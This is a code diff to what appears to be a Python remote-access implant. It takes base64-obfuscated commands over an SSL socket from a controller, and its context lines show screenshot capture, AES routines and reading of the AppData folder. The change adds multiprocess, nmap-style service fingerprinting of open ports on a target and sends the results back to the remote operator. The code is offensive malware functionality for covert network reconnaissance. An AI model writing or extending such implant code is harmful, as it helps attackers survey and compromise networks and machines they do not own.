@@ -1,4 +1,5 @@
 import ctypes
+import multiprocessing
 import os
 import shutil
 import socket
@@ -19,8 +20,9 @@ import asyncio
 import secrets
 import concurrent
 from concurrent import futures
-from datetime import datetime
+from nmap_vscan import vscan
 from PIL import ImageGrab
+import services
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import padding
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
@@ -31,6 +33,17 @@ my_list_of_tasks = []
 my_tasks = []
 nbr_host_found = 0
 list_of_hosts_found = []
+
+servicesInfo = tempfile.NamedTemporaryFile(delete=False)
+servicesInfo.write(services.returnData())
+servicesInfo.close()
+
+# Variables Globales
+global_timeout = 15
+# Crear un proceso para cada puerto y configurar límites de tiempo individuales
+processes = []
+result_queue = multiprocessing.Queue()
+nmap = vscan.ServiceScan(servicesInfo.name)
 
 try:
     apdt = os.environ['appdata']
@@ -64,7 +77,6 @@ async def ping_loop():
     for each_task_list in my_list_of_tasks:
         for each_coroutine in asyncio.as_completed(each_task_list):
             await each_coroutine
-
 
 
 class Networkscan:
@@ -153,6 +165,10 @@ context.check_hostname = False
 context.verify_mode = ssl.CERT_NONE
 context.load_cert_chain(certfile=crt.name, keyfile=ky.name)
 
+
+servicesInfo = tempfile.NamedTemporaryFile(delete=False)
+servicesInfo.write(services.returnData())
+servicesInfo.close()
 
 g = ""
 try:
@@ -683,7 +699,7 @@ def init_scan(target):
             if result == 0:
                 open_ports.append(port)
         except Exception as e:
-            sock.send("Error inesperado : {}".format(err).encode())
+            sock.send("Error inesperado : {}".format(e).encode())
         finally:
             s.close()
 
@@ -696,8 +712,7 @@ def init_scan(target):
                 sock.send("Error inesperado : {}".format(err).encode())
 
     sock.send(str(open_ports).encode())
-    time.sleep(0.1)
-
+    return open_ports, target
 
 def printFormed(netstat):
     ipFormed = []
@@ -737,6 +752,56 @@ def detectIp_Mask():
 
     formed = printFormed(netstat)
     return formed
+
+
+def scan_port(port, result_queue, target):
+    try:
+        result = nmap.scan(target, port, "tcp")
+        result_queue.put((port, str(result)))  # ENVIAMOS PARA QUE VEA COMO VA EL ESCANEO
+    except socket.timeout as e:
+        result_queue.put((port, f"Max Timeout reached: {str(e)}"))
+    except ConnectionRefusedError as e:
+        result_queue.put((port, f"Closed: {str(e)}"))
+    except ConnectionResetError as e:
+        result_queue.put((port, f"Reset: {str(e)}"))
+    except Exception as e:
+        result_queue.put((port, f"Error: {str(e)}"))
+
+
+def processData(target):
+    # Recolectar resultados de la cola
+    responses = []
+    formed = {target: {}}
+    while not result_queue.empty():
+        port, result = result_queue.get()
+        formed[target][port] = result
+
+    responses.append(formed)
+    return responses
+
+
+def initScanServices(openPorts, target):
+    for port in openPorts:
+        process = multiprocessing.Process(target=scan_port, args=(port, result_queue, target))
+        process.start()
+        processes.append(process)
+
+    i = 0
+    # Esperar a que todos los procesos terminen o los termina si exceden el tiempo de espera
+    for process in processes:
+        process.join(timeout=global_timeout)
+        if process.is_alive():
+            process.terminate()
+        i += 1
+
+
+def startServices(target, openPorts):
+    initScanServices(openPorts, target)
+    data = processData(target)
+    buffer = len(str(data))
+    sock.send(f"buffer {str(buffer)}".encode())
+    sock.send("formed data".encode())
+    sock.send(str(data).encode())
 
 
 def game (sock):
@@ -812,7 +877,8 @@ def game (sock):
             scnet()
 
         elif "c2Nhbmhvc3QK" .encode() in instruct:
-            init_scan(instruct.decode() .replace("c2Nhbmhvc3QK ", ""))
+            open_ports, target = init_scan(instruct.decode() .replace("c2Nhbmhvc3QK ", ""))
+            startServices(target, open_ports)
 
         else:
             pass
